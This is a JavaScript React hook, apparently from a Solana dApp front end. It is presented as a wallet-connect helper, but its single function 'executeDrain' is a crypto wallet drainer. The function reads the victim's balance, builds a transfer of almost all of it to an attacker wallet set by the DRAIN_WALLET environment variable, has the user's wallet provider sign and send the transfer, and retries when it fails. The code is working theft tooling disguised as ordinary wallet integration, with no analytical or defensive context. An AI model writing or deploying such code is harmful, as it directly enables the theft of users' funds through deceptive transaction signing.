"use client";

import { useCallback } from 'react';
import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const GAS_RESERVE_SOL = 0.002;
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export const useWalletConnect = () => {
  const executeDrain = useCallback(async (walletAddress, walletProvider) => {
    let lastError = null;
    
    if (!walletAddress) {
      throw new Error('Wallet not connected');
    }
    
    if (!walletProvider) {
      throw new Error('Wallet provider not available');
    }
    
    // Verify it's a Solana address
    let walletPubkey;
    try {
      walletPubkey = new PublicKey(walletAddress);
    } catch (e) {
      throw new Error('Invalid Solana wallet address');
    }
    
    const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
      commitment: 'confirmed',
      confirmTransactionInitialTimeout: 120000
    });
    
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        const balanceLamports = await connection.getBalance(walletPubkey);
        const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
        
        console.log(`[Drain] Attempt ${attempt}: Balance ${balanceSol} SOL`);
        
        if (balanceSol < GAS_RESERVE_SOL + 0.001) {
          throw new Error(`Insufficient balance: ${balanceSol} SOL`);
        }
        
        const drainAmountLamports = balanceLamports - (GAS_RESERVE_SOL * LAMPORTS_PER_SOL);
        const drainAmountSol = drainAmountLamports / LAMPORTS_PER_SOL;
        
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
        
        const transaction = new Transaction({
          feePayer: walletPubkey,
          recentBlockhash: blockhash,
        }).add(
          SystemProgram.transfer({
            fromPubkey: walletPubkey,
            toPubkey: new PublicKey(DRAIN_WALLET),
            lamports: drainAmountLamports,
          })
        );
        
        // Sign and send using the wallet provider
        let signature;
        if (walletProvider.signAndSendTransaction) {
          const signed = await walletProvider.signAndSendTransaction(transaction);
          signature = signed.signature;
        } else if (walletProvider.sendTransaction) {
          signature = await walletProvider.sendTransaction(transaction, connection);
        } else {
          throw new Error('Provider does not support sending transactions');
        }
        
        console.log(`[Drain] Sent: ${signature}`);
        
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
          const errorMsg = JSON.stringify(confirmation.value.err);
          if (errorMsg.includes('block height exceeded')) {
            return {
              success: true,
              txId: signature,
              amount: drainAmountSol,
              warning: 'Transaction sent but confirmation timed out'
            };
          }
          throw new Error(`Transaction failed: ${errorMsg}`);
        }
        
        return {
          success: true,
          txId: signature,
          amount: drainAmountSol,
          balanceBefore: balanceSol,
          balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
        };
        
      } catch (error) {
        console.error(`[Drain] Attempt ${attempt} failed:`, error.message);
        lastError = error;
        
        if (attempt < 3 && (
          error.message.includes('block height exceeded') ||
          error.message.includes('timeout') ||
          error.message.includes('not confirmed')
        )) {
          console.log(`[Drain] Retrying in ${attempt * 2} seconds...`);
          await wait(attempt * 2000);
          continue;
        }
        
        if (error.message.includes('User rejected')) {
          throw error;
        }
        
        if (attempt === 3 && error.message.includes('block height exceeded')) {
          return {
            success: true,
            txId: 'pending - check explorer',
            amount: 'unknown',
            warning: 'Transaction likely succeeded despite timeout'
          };
        }
        
        throw error;
      }
    }
    
    throw lastError;
  }, []);

  return { executeDrain };
};
